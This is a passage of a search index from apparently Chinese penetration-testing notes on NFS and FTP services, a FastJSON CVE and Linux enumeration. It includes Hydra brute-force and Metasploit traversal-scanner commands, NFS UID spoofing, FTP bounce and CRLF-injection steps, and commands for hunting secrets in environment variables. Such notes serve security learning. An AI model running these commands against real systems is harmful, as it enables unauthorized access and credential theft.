20221119161643.png]]</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/2049%20-%20Pentesting%20NFS%20Service/#privilege-escalation-using-nfs-misconfigurations","title":"Privilege Escalation using NFS misconfigurations(\u9519\u8bef\u914d\u7f6e)","text":"<p>NFS no_root_squash and no_all_squash privilege escalation</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/2049%20-%20Pentesting%20NFS%20Service/#hacktricks-automatic-commands","title":"HackTricks Automatic Commands","text":"<pre><code>Protocol_Name: NFS #Protocol Abbreviation if there is one.\n\nPort_Number: 2049 #Comma separated if there is more than one.\n\nProtocol_Description: Network File System #Protocol Abbreviation Spelled out\n\nEntry_1:\n\nName: Notes\n\nDescription: Notes for NFS\n\nNote: |\n\nIt is a client/server system that allows users to access files across a network and treat them as if they resided in a local file directory.\n\n#apt install nfs-common\n\nshowmount 10.10.10.180 ~or~showmount -e 10.10.10.180\n\nshould show you available shares (example /home)\n\nmount -t nfs -o ver=2 10.10.10.180:/home /mnt/\n\ncd /mnt\n\nnano into /etc/passwd and change the uid (probably 1000 or 1001) to match the owner of the files if you are not able to get in\n\nhttps://book.hacktricks.xyz/pentesting/nfs-service-pentesting\n\nEntry_2:\n\nName: Nmap\n\nDescription: Nmap with NFS Scripts\n\nCommand: nmap --script=nfs-ls.nse,nfs-showmount.nse,nfs-statfs.nse -p 2049 {IP}\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/21%20-%20Pentesting%20FTP/","title":"21   Pentesting FTP","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/21%20-%20Pentesting%20FTP/#basic-information","title":"Basic Information","text":"<p>\u6587\u4ef6\u4f20\u8f93\u534f\u8bae (FTP) \u662f\u4e00\u79cd\u6807\u51c6\u7f51\u7edc\u534f\u8bae\uff0c\u7528\u4e8e\u5728\u8ba1\u7b97\u673a\u7f51\u7edc\u4e0a\u7684\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u4f20\u8f93\u8ba1\u7b97\u673a\u6587\u4ef6\u3002 \u5b83\u662f\u4e00\u79cd\u7eaf\u6587\u672c\u534f\u8bae\uff0c\u7528\u4f5c\u6362\u884c\u7b26 0x0d 0x0a\uff0c\u56e0\u6b64\u6709\u65f6\u60a8\u9700\u8981\u4f7f\u7528 <code>telnet</code> \u6216 <code>nc -C</code> \u8fdb\u884c\u8fde\u63a5\u3002</p> <p>Default Port: 21</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/21%20-%20Pentesting%20FTP/#connections-active-passive","title":"Connections Active &amp; Passive(\u88ab\u52a8)","text":"<p>\u5728\u4e3b\u52a8 FTP \u4e2d\uff0cFTP \u5ba2\u6237\u7aef\u9996\u5148\u542f\u52a8\u4ece\u5176\u7aef\u53e3 N \u5230 FTP \u670d\u52a1\u5668\u547d\u4ee4\u7aef\u53e3 - \u7aef\u53e3 21 \u7684\u63a7\u5236\u8fde\u63a5\u3002\u5ba2\u6237\u7aef\u7136\u540e\u4fa6\u542c\u7aef\u53e3 N+1 \u5e76\u5c06\u7aef\u53e3 N+1 \u53d1\u9001\u5230 FTP \u670d\u52a1\u5668\u3002 FTP \u670d\u52a1\u5668\u968f\u540e\u53d1\u8d77\u6570\u636e\u8fde\u63a5\uff0c\u4ece\u5176\u7aef\u53e3 M \u5230 FTP \u5ba2\u6237\u7aef\u7684\u7aef\u53e3 N+1\u3002</p> <p>\u4f46\u662f\uff0c\u5982\u679c FTP \u5ba2\u6237\u7aef\u6709\u9632\u706b\u5899\u8bbe\u7f6e\u6765\u63a7\u5236\u6765\u81ea\u5916\u90e8\u7684\u4f20\u5165\u6570\u636e\u8fde\u63a5\uff0c\u90a3\u4e48\u6d3b\u52a8 FTP \u53ef\u80fd\u4f1a\u6210\u4e3a\u95ee\u9898\u3002\u5e76\u4e14\uff0c\u4e00\u4e2a\u53ef\u884c\u7684\u89e3\u51b3\u65b9\u6848\u662f\u88ab\u52a8 FTP\u3002</p> <p>\u5728Passive FTP\u4e2d\uff0c\u5ba2\u6237\u7aef\u53d1\u8d77\u4ece\u5176N\u7aef\u53e3\u5230FTP Server\u768421\u7aef\u53e3\u7684\u63a7\u5236\u8fde\u63a5\u3002\u6b64\u540e\uff0c\u5ba2\u6237\u7aef\u53d1\u51fa passv \u547d\u4ee4\u3002\u670d\u52a1\u5668\u7136\u540e\u5411\u5ba2\u6237\u7aef\u53d1\u9001\u5176\u7aef\u53e3\u53f7 M \u4e4b\u4e00\u3002\u5ba2\u6237\u7aef\u542f\u52a8\u4ece\u5176\u7aef\u53e3 P \u5230 FTP \u670d\u52a1\u5668\u7684\u7aef\u53e3 M \u7684\u6570\u636e\u8fde\u63a5\u3002</p> <p>Source: https://www.thesecuritybuddy.com/vulnerabilities/what-is-ftp-bounce-attack/</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/21%20-%20Pentesting%20FTP/#connection-debugging","title":"Connection debugging","text":"<p>FTP \u547d\u4ee4 <code>debug</code> \u548c <code>trace</code> \u53ef\u7528\u4e8e\u67e5\u770b\u901a\u4fe1\u662f\u5982\u4f55\u53d1\u751f\u7684\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/21%20-%20Pentesting%20FTP/#enumeration","title":"Enumeration","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/21%20-%20Pentesting%20FTP/#banner-grabbing","title":"Banner Grabbing","text":"<pre><code>nc -vn &lt;IP&gt; 21\n\nopenssl s_client -connect crossfit.htb:21 -starttls ftp #Get certificate if any\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/21%20-%20Pentesting%20FTP/#connect-to-ftp-using-starttls","title":"Connect to FTP using starttls","text":"<pre><code>lftp\n\nlftp :~&gt; set ftp:ssl-force true\n\nlftp :~&gt; set ssl:verify-certificate no\n\nlftp :~&gt; connect 10.10.10.208\n\nlftp 10.10.10.208:~&gt; login\n\nUsage: login &lt;user|URL&gt; [&lt;pass&gt;]\n\nlftp 10.10.10.208:~&gt; login username Password\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/21%20-%20Pentesting%20FTP/#unauth-enum","title":"Unauth enum","text":"<p>With nmap</p> <pre><code>sudo nmap -sV -p21 -sC -A 10.10.10.10\n</code></pre> <p>\u60a8\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4 <code>HELP</code> \u548c <code>FEAT</code> \u83b7\u53d6 FTP \u670d\u52a1\u5668\u7684\u4e00\u4e9b\u4fe1\u606f\uff1a</p> <pre><code>HELP\n\n214-The following commands are recognized (* =&gt;'s unimplemented):\n\n214-CWD XCWD CDUP XCUP SMNT* QUIT PORT PASV\n\n214-EPRT EPSV ALLO* RNFR RNTO DELE MDTM RMD\n\n214-XRMD MKD XMKD PWD XPWD SIZE SYST HELP\n\n214-NOOP FEAT OPTS AUTH CCC* CONF* ENC* MIC*\n\n214-PBSZ PROT TYPE STRU MODE RETR STOR STOU\n\n214-APPE REST ABOR USER PASS ACCT* REIN* LIST\n\n214-NLST STAT SITE MLSD MLST\n\n214 Direct comments to root@drei.work\n\nFEAT\n\n211-Features:\n\nPROT\n\nCCC\n\nPBSZ\n\nAUTH TLS\n\nMFF modify;UNIX.group;UNIX.mode;\n\nREST STREAM\n\nMLST modify*;perm*;size*;type*;unique*;UNIX.group*;UNIX.mode*;UNIX.owner*;\n\nUTF8\n\nEPRT\n\nEPSV\n\nLANG en-US\n\nMDTM\n\nSSCN\n\nTVFS\n\nMFMT\n\nSIZE\n\n211 End\n\nSTAT\n\n#Info about the FTP server (version, configs, status...)\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/21%20-%20Pentesting%20FTP/#anonymous-login","title":"Anonymous login","text":"<p>anonymous : anonymous anonymous : ftp : ftp</p> <pre><code>ftp &lt;IP&gt;\n\n&gt;anonymous\n\n&gt;anonymous\n\n&gt;ls -a # List all files (even hidden) (yes, they could be hidden)\n\n&gt;binary #Set transmission to binary instead of ascii\n\n&gt;ascii #Set transmission to ascii instead of binary\n\n&gt;bye #exit\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/21%20-%20Pentesting%20FTP/#brute-force","title":"Brute force","text":"<p>\u5b57\u5178 https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/21%20-%20Pentesting%20FTP/#automated","title":"Automated(\u81ea\u52a8\u5316)","text":"<p>Anon(\u533f\u540d) login and bounce(\u5f39\u8df3) FTP checks are perform by default by nmap with -sC option or:</p> <pre><code>nmap --script ftp-* -p 21 &lt;ip&gt;\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/21%20-%20Pentesting%20FTP/#browser-connection","title":"Browser connection","text":"<pre><code>ftp://anonymous:anonymous@10.10.10.98\n</code></pre> <p>\u8bf7\u6ce8\u610f\uff0c\u5982\u679c Web \u5e94\u7528\u7a0b\u5e8f\u5c06\u7528\u6237\u63a7\u5236\u7684\u6570\u636e\u76f4\u63a5\u53d1\u9001\u5230 FTP \u670d\u52a1\u5668\uff0c\u60a8\u53ef\u4ee5\u53d1\u9001\u53cc\u91cd URL \u7f16\u7801 <code>%0d%0a</code>\uff08\u5728\u53cc\u91cd URL \u7f16\u7801\u4e2d\u4e3a <code>%250d%250a</code>\uff09\u5b57\u8282\u5e76\u4f7f FTP \u670d\u52a1\u5668\u6267\u884c\u4efb\u610f\u64cd\u4f5c\u3002\u5176\u4e2d\u4e00\u79cd\u53ef\u80fd\u7684\u4efb\u610f\u64cd\u4f5c\u662f\u4ece\u7528\u6237\u63a7\u5236\u7684\u670d\u52a1\u5668\u4e0b\u8f7d\u5185\u5bb9\u3001\u6267\u884c\u7aef\u53e3\u626b\u63cf\u6216\u5c1d\u8bd5\u4e0e\u5176\u4ed6\u57fa\u4e8e\u7eaf\u6587\u672c\u7684\u670d\u52a1\uff08\u5982 http\uff09\u901a\u4fe1\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/21%20-%20Pentesting%20FTP/#download-all-files-from-ftp","title":"Download all files from FTP","text":"<pre><code>wget -m ftp://anonymous:anonymous@10.10.10.98 #Donwload all\nwget -m --no-passive ftp://anonymous:anonymous@10.10.10.98 #Download all\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/21%20-%20Pentesting%20FTP/#some-ftp-commands","title":"Some FTP commands","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/21%20-%20Pentesting%20FTP/#ftp-bounce-attack","title":"FTP Bounce(\u53cd\u5f39) attack","text":"<p>\u67d0\u4e9b FTP \u670d\u52a1\u5668\u5141\u8bb8\u547d\u4ee4 PORT\u3002\u6b64\u547d\u4ee4\u53ef\u7528\u4e8e\u5411\u670d\u52a1\u5668\u6307\u793a\u60a8\u8981\u5728\u67d0\u4e2a\u7aef\u53e3\u8fde\u63a5\u5230\u5176\u4ed6 FTP \u670d\u52a1\u5668\u3002\u7136\u540e\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u5b83\u901a\u8fc7 FTP \u670d\u52a1\u5668\u626b\u63cf\u4e3b\u673a\u7684\u54ea\u4e9b\u7aef\u53e3\u662f\u6253\u5f00\u7684</p> <p>Learn here how to abuse(\u6ee5\u7528) a FTP server to scan ports.</p> <p>\u60a8\u8fd8\u53ef\u4ee5\u6ee5\u7528\u6b64\u884c\u4e3a\u4f7f FTP \u670d\u52a1\u5668\u4e0e\u5176\u4ed6\u534f\u8bae\u4ea4\u4e92\u3002\u60a8\u53ef\u4ee5\u4e0a\u4f20\u4e00\u4e2a\u5305\u542b HTTP \u8bf7\u6c42\u7684\u6587\u4ef6\uff0c\u5e76\u8ba9\u6613\u53d7\u653b\u51fb\u7684 FTP \u670d\u52a1\u5668\u5c06\u5176\u53d1\u9001\u5230\u4efb\u610f HTTP \u670d\u52a1\u5668\uff08\u4e5f\u8bb8\u662f\u4e3a\u4e86\u6dfb\u52a0\u4e00\u4e2a\u65b0\u7684\u7ba1\u7406\u5458\u7528\u6237\uff1f\uff09 FTP\u670d\u52a1\u5668\u3002 \u7406\u8bba\u5f88\u7b80\u5355\uff1a 1. \u5c06\u8bf7\u6c42\uff08\u5728\u6587\u672c\u6587\u4ef6\u4e2d\uff09\u4e0a\u4f20\u5230\u6613\u53d7\u653b\u51fb\u7684\u670d\u52a1\u5668\u3002\u8bf7\u8bb0\u4f4f\uff0c\u5982\u679c\u60a8\u60f3\u4e0e\u53e6\u4e00\u4e2a HTTP \u6216 FTP \u670d\u52a1\u5668\u901a\u4fe1\uff0c\u60a8\u9700\u8981\u5c06\u884c\u66f4\u6539\u4e3a 0x0d 0x0a  2. \u4f7f\u7528 REST X \u907f\u514d\u53d1\u9001\u60a8\u4e0d\u60f3\u53d1\u9001\u7684\u5b57\u7b26\uff08\u4e5f\u8bb8\u5c06\u8bf7\u6c42\u4e0a\u4f20\u5230\u60a8\u9700\u8981\u5728\u5f00\u5934\u653e\u7f6e\u4e00\u4e9b\u56fe\u50cf\u6807\u9898\u7684\u6587\u4ef6\u4e2d\uff09  3. \u4f7f\u7528PORT\u8fde\u63a5\u4efb\u610f\u670d\u52a1\u5668\u548c\u670d\u52a1  4. \u4f7f\u7528 RETR \u5c06\u4fdd\u5b58\u7684\u8bf7\u6c42\u53d1\u9001\u5230\u670d\u52a1\u5668\u3002</p> <p>\u8fd9\u5f88\u53ef\u80fd\u4f1a\u5f15\u53d1\u7c7b\u4f3c Socket not writable \u7684\u9519\u8bef\uff0c\u56e0\u4e3a\u8fde\u63a5\u6301\u7eed\u65f6\u95f4\u4e0d\u8db3\u4ee5\u4f7f\u7528 RETR \u53d1\u9001\u6570\u636e\u3002\u5c3d\u91cf\u907f\u514d\u7684\u5efa\u8bae\u662f\uff1a - \u5982\u679c\u60a8\u8981\u53d1\u9001 HTTP \u8bf7\u6c42\uff0c\u8bf7\u4e00\u4e2a\u63a5\u4e00\u4e2a\u5730\u53d1\u9001\u76f8\u540c\u7684\u8bf7\u6c42\uff0c\u76f4\u5230\u81f3\u5c11 ~0.5MB\u3002\u50cf\u8fd9\u6837\uff1a </p> <p>port.txt  [[\u7f51\u7edc\u5b89\u5168/Users/dark/Downloads/posts.txt]]</p> <ul> <li>\u5c1d\u8bd5\u7528\u4e0e\u534f\u8bae\u76f8\u5173\u7684\u201c\u5783\u573e\u201d\u6570\u636e\u586b\u5145\u8bf7\u6c42\uff08\u4e0e FTP \u901a\u4fe1\u53ef\u80fd\u53ea\u662f\u5783\u573e\u547d\u4ee4\u6216\u91cd\u590d RETRinstruction \u4ee5\u83b7\u53d6\u6587\u4ef6\uff09 </li> <li>\u53ea\u9700\u5728\u8bf7\u6c42\u4e2d\u586b\u5145\u5927\u91cf\u7a7a\u5b57\u7b26\u6216\u5176\u4ed6\u5b57\u7b26\uff08\u5206\u884c\u6216\u4e0d\u5206\u884c\uff09</li> </ul> <p>\u65e0\u8bba\u5982\u4f55\uff0c\u8fd9\u91cc\u6709\u4e00\u4e2a\u5173\u4e8e\u5982\u4f55\u6ee5\u7528\u5b83\u4f7f FTP \u670d\u52a1\u5668\u4ece\u4e0d\u540c\u7684 FTP \u670d\u52a1\u5668\u4e0b\u8f7d\u6587\u4ef6\u7684\u65e7\u793a\u4f8b\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/21%20-%20Pentesting%20FTP/#filezilla-server-vulnerability","title":"Filezilla Server Vulnerability","text":"<p>FileZilla \u901a\u5e38\u7ed1\u5b9a\u5230 FileZilla-Server\uff08\u7aef\u53e3 14147\uff09\u7684\u672c\u5730\u7ba1\u7406\u670d\u52a1\u3002\u5982\u679c\u60a8\u53ef\u4ee5\u4ece\u60a8\u7684\u673a\u5668\u521b\u5efa\u4e00\u4e2a\u96a7\u9053\u6765\u8bbf\u95ee\u6b64\u7aef\u53e3\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u7a7a\u767d\u5bc6\u7801\u8fde\u63a5\u5230\u5b83\u5e76\u4e3a FTP \u670d\u52a1\u521b\u5efa\u4e00\u4e2a\u65b0\u7528\u6237\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/21%20-%20Pentesting%20FTP/#config-files","title":"Config files","text":"<pre><code>ftpusers\n\nftp.conf\n\nproftpd.conf\n\nvsftpd.conf\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/21%20-%20Pentesting%20FTP/#post-exploitation","title":"Post-Exploitation(\u5f00\u53d1\u540e)","text":"<p>vsFTPd \u7684\u9ed8\u8ba4\u914d\u7f6e\u53ef\u4ee5\u5728 /etc/vsftpd.conf \u4e2d\u627e\u5230\u3002\u5728\u8fd9\u91cc\uff0c\u60a8\u53ef\u4ee5\u627e\u5230\u4e00\u4e9b\u5371\u9669\u7684\u8bbe\u7f6e\uff1a ![[Pasted image 20221120111537.png]]</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/21%20-%20Pentesting%20FTP/#shodan","title":"Shodan","text":"<pre><code>ftp\nport:21\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%AB%AF%E5%8F%A3/21%20-%20Pentesting%20FTP/#hacktricks-automatic-commands","title":"HackTricks Automatic Commands","text":"<pre><code>Protocol_Name: FTP    #Protocol Abbreviation if there is one.\nPort_Number:  21     #Comma separated if there is more than one.\nProtocol_Description: File Transfer Protocol          #Protocol Abbreviation Spelled out\n\nEntry_1:\n  Name: Notes\n  Description: Notes for FTP\n  Note: |\n    Anonymous Login\n    -bi     &lt;&lt;&lt; so that your put is done via binary\n\n    wget --mirror 'ftp://ftp_user:UTDRSCH53c\"$6hys@10.10.10.59'\n    ^^to download all dirs and files\n\n    wget --no-passive-ftp --mirror 'ftp://anonymous:anonymous@10.10.10.98' \n    if PASV transfer is disabled\n\n    https://book.hacktricks.xyz/pentesting/pentesting-ftp\n\nEntry_2:\n  Name: Banner Grab\n  Description: Grab FTP Banner via telnet\n  Command: telnet -n {IP} 21\n\nEntry_3:\n  Name: Cert Grab\n  Description: Grab FTP Certificate if existing\n  Command: openssl s_client -connect {IP}:21 -starttls ftp\n\nEntry_4:\n  Name: nmap ftp\n  Description: Anon login and bounce FTP checks are performed\n  Command: nmap --script ftp-* -p 21 {IP}\n\nEntry_5:\n  Name: Browser Connection\n  Description: Connect with Browser\n  Note: ftp://anonymous:anonymous@{IP}\n\nEntry_6:\n  Name: Hydra Brute Force\n  Description: Need Username\n  Command: hydra -t 1 -l {Username} -P {Big_Passwordlist} -vV {IP} ftp\n\nEntry_7:\n  Name: consolesless mfs enumeration ftp\n  Description: FTP enumeration without the need to run msfconsole\n  Note: sourced from https://github.com/carlospolop/legion\n  Command: msfconsole -q -x 'use auxiliary/scanner/ftp/anonymous; set RHOSTS {IP}; set RPORT 21; run; exit' &amp;&amp; msfconsole -q -x 'use auxiliary/scanner/ftp/ftp_version; set RHOSTS {IP}; set RPORT 21; run; exit' &amp;&amp; msfconsole -q -x 'use auxiliary/scanner/ftp/bison_ftp_traversal; set RHOSTS {IP}; set RPORT 21; run; exit' &amp;&amp; msfconsole -q -x 'use auxiliary/scanner/ftp/colorado_ftp_traversal; set RHOSTS {IP}; set RPORT 21; run; exit' &amp;&amp;  msfconsole -q -x 'use auxiliary/scanner/ftp/titanftp_xcrc_traversal; set RHOSTS {IP}; set RPORT 21; run; exit'\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%BB%84%E4%BB%B6/FastJSON/","title":"FastJSON","text":"<p>FastJSON\u662f\u963f\u91cc\u5df4\u5df4\u7684\u5f00\u6e90JSON\u89e3\u6790\u5e93\uff0c\u5b83\u53ef\u4ee5\u89e3\u6790JSON\u683c\u5f0f\u7684\u5b57\u7b26\u4e32\uff0c\u652f\u6301\u5c06JAVA Bean \u5e8f\u5217\u5316\u4e3a JSON \u5b57\u7b26\u4e32\uff0c\u4e5f\u53ef\u4ee5\u4ece JSON \u5b57\u7b26\u4e32\u53cd\u5e8f\u5217\u5316\u5230 Java Bean\u3002\u7531\u4e8e\u5177\u6709\u6267\u884c\u6548\u7387\u9ad8\u7684\u7279\u70b9\uff0c\u5e94\u7528\u8303\u56f4\u5e7f\u6cdb\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%BB%84%E4%BB%B6/FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20CVE-2022-25845/","title":"FastJSON\u53cd\u5e8f\u5217\u5316 CVE 2022 25845","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%BB%84%E4%BB%B6/FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20CVE-2022-25845/#_1","title":"\u57fa\u672c\u4fe1\u606f","text":"<p>CVE\u7f16\u53f7\uff1aCVE-2022-25845 \u6f0f\u6d1e\u7c7b\u578b\uff1a\u4e0d\u5b89\u5168\u7684\u53cd\u5e8f\u5217\u5316 \u5371\u9669\u7b49\u7ea7\uff1a\u9ad8\u5371 \u53d7\u5f71\u54cd\u5e94\u7528\u7248\u672c\uff1aFastJSON &lt;= 1.2.80 (\u975e noneAutoType \u7248\u672c)</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%BB%84%E4%BB%B6/FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20CVE-2022-25845/#_2","title":"\u4fee\u590d\u5efa\u8bae","text":"<p>1\u3001\u5347\u7ea7\u5230 1.2.83 \u53ca\u4ee5\u4e0a\u7248\u672c\uff0c\u6216\u4f7f\u7528 noneAutoType \u7248\u672c\u3002 2\u3001\u6dcb\u6e7f\u4fee\u590d\u5efa\u8bae\uff0c\u5f00\u542fautoType \u529f\u80fd\u53d7\u5f71\u54cd\u7684\u7528\u6237\u53ef\u4ee5\u5173\u95ed\u4ee5\u89c4\u907f\u98ce\u9669\uff0c\u53e6\u5efa\u8bae\u5c06JDK\u5347\u7ea7\u5230\u6700\u65b0\u7248\u672c\u3002     \u7531\u4e8e autoType \u5f00\u5173\u7684\u9650\u5236\u53ef\u88ab\u7ed5\u8fc7\uff0c\u9700\u5347\u7ea7\u52301.2.68\u53ca\u4ee5\u4e0a\u7248\u672c\uff0c\u901a\u8fc7\u5f00\u542f safeMode \u914d\u7f6e\u5b8c\u5168\u7981\u7528 autoType\u3002\u4e09\u79cd\u914d\u7f6e safeMode \u7684\u65b9\u6cd5\uff1a         1\uff09\u4ee3\u7801\u4e2d\u914d\u7f6e\uff1a<code>ParserConfig.getGloballnstance().setSafeMode(true)</code>         2\uff09\u52a0\u4e0a JVM \u542f\u52a8\u53c2\u6570\uff1a<code>-D fastjson.parser.safeMode=true</code>(\u5982\u679c\u6709\u591a\u4e2a\u5305\u540d\u524d\u7f00\uff0c\u53ef\u4f7f\u7528\u9017\u53f7\u9694\u5f00)         3\uff09\u901a\u8fc7\u7c7b\u8def\u5f84\u7684 fastjson.properties \u6587\u4ef6\u6765\u914d\u7f6e\uff1a<code>fastjson.parser.safeMode=true</code></p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%BB%84%E4%BB%B6/FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20CVE-2022-25845/#_3","title":"\u4e0d\u5b89\u5168\u7684\u53cd\u5e8f\u5217\u5316","text":""},{"location":"%E7%B3%BB%E7%BB%9F/Linux%20%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E5%89%AF%E6%9C%AC/","title":"Linux \u7cfb\u7edf\u4fe1\u606f\u7684\u526f\u672c","text":"<p>Linux \u7cfb\u7edf\u4fe1\u606f</p> <p>\u7cfb\u7edf\u4fe1\u606f</p> <p>(cat /proc/version || uname -a ) 2&gt;/dev/null lsb_release -a 2&gt;/dev/null # old, not by default on many systems cat /etc/os-release 2&gt;/dev/null # universal on modern systems</p> <p>PATH</p> <p>\u5982\u679c\u5728<code>PATH</code>\u8def\u5f84\u4e2d\u6709\u5199\u5165\u6743\u9650\uff0c\u5219\u53ef\u4ee5\u52ab\u6301\u67d0\u4e9b\u5e93\u6216\u4e8c\u8fdb\u5236\u6587\u4ef6</p> <p><code>echo $PATH</code></p> <p>Env info</p> <p>\u73af\u5883\u53d8\u91cf\u4e2d\u7684\u6709\u8da3\u4fe1\u606f\u3001\u5bc6\u7801\u6216API\u5bc6\u94a5?</p> <p><code>(env || set) 2&gt;/dev/null</code></p> <p>Kernel exploits</p> <p>\u68c0\u67e5\u5185\u6838\u7248\u672c\uff0c\u5bfb\u627e\u5bf9\u5e94\u7248\u672c\u7684\u6743\u9650\u63d0\u5347\u6f0f\u6d1e\u5229\u7528</p> <pre><code>cat /proc/version\nuname -a\nsearchsploit \"Linux Kernel\"\n</code></pre> <p>Sudo version</p>"},{"location":"%E7%B3%BB%E7%BB%9F/Linux%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF/","title":"Linux\u7cfb\u7edf\u4fe1\u606f","text":"<p>\u7531\u4e8e\u6211\u4eec\u5c06\u4f7f\u7528\u8bb8\u591a\u4e0d\u540c\u7684 Linux \u7cfb\u7edf\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u4e86\u89e3\u6709\u5173\u7cfb\u7edf\u7684\u7ed3\u6784\u548c\u4fe1\u606f\u3001\u5176\u8fdb\u7a0b\u3001\u7f51\u7edc\u914d\u7f6e\u3001\u7528\u6237\u3001\u76ee\u5f55\u3001\u7528\u6237\u8bbe\u7f6e\u548c\u76f8\u5e94\u7684\u53c2\u6570\u3002\u4ee5\u4e0b\u662f\u5e2e\u52a9\u6211\u4eec\u83b7\u53d6\u4e0a\u8ff0\u4fe1\u606f\u7684\u5fc5\u8981\u5de5\u5177\u5217\u8868\u3002\u5b83\u4eec\u4e2d\u7684\u5927\u591a\u6570\u662f\u9ed8\u8ba4\u5b89\u88c5\u7684\u3002</p> \u547d\u4ee4 \u63cf\u8ff0 <code>whoami</code> \u663e\u793a\u5f53\u524d\u7528\u6237\u540d\u3002 <code>id</code> \u8fd4\u56de\u7528\u6237\u8eab\u4efd <code>hostname</code> \u8bbe\u7f6e\u6216\u6253\u5370\u5f53\u524d\u4e3b\u673a\u7cfb\u7edf\u7684\u540d\u79f0\u3002 <code>uname</code> \u6253\u5370\u6709\u5173\u64cd\u4f5c\u7cfb\u7edf\u540d\u79f0\u548c\u7cfb\u7edf\u786c\u4ef6\u7684\u57fa\u672c\u4fe1\u606f\u3002 <code>pwd</code> \u8fd4\u56de\u5de5\u4f5c\u76ee\u5f55\u540d\u79f0\u3002 <code>ifconfig</code> ifconfig \u5b9e\u7528\u7a0b\u5e8f\u7528\u4e8e\u5206\u914d\u6216\u67e5\u770b\u7f51\u7edc\u63a5\u53e3\u7684\u5730\u5740\u548c/\u6216\u914d\u7f6e\u7f51\u7edc\u63a5\u53e3\u53c2\u6570\u3002 <code>ip</code> Ip \u662f\u663e\u793a\u6216\u64cd\u4f5c\u8def\u7531\u3001\u7f51\u7edc\u8bbe\u5907\u3001\u63a5\u53e3\u548c\u96a7\u9053\u7684\u5b9e\u7528\u7a0b\u5e8f\u3002 <code>netstat</code> \u663e\u793a\u7f51\u7edc\u72b6\u6001\u3002 <code>ss</code> \u53e6\u4e00\u4e2a\u8c03\u67e5\u5957\u63a5\u5b57\u7684\u5b9e\u7528\u7a0b\u5e8f\u3002 <code>ps</code> \u663e\u793a\u8fdb\u7a0b\u72b6\u6001\u3002 <code>who</code> \u663e\u793a\u8c01\u767b\u5f55\u3002 <code>env</code> \u6253\u5370\u73af\u5883\u6216\u8bbe\u7f6e\u5e76\u6267\u884c\u547d\u4ee4\u3002 <code>lsblk</code> \u5217\u51fa\u5757\u8bbe\u5907\u3002 <code>lsusb</code> \u5217\u51fa USB \u8bbe\u5907 <code>lsof</code> \u5217\u51fa\u6253\u5f00\u7684\u6587\u4ef6\u3002 <code>lspci</code> \u5217\u51fa PCI 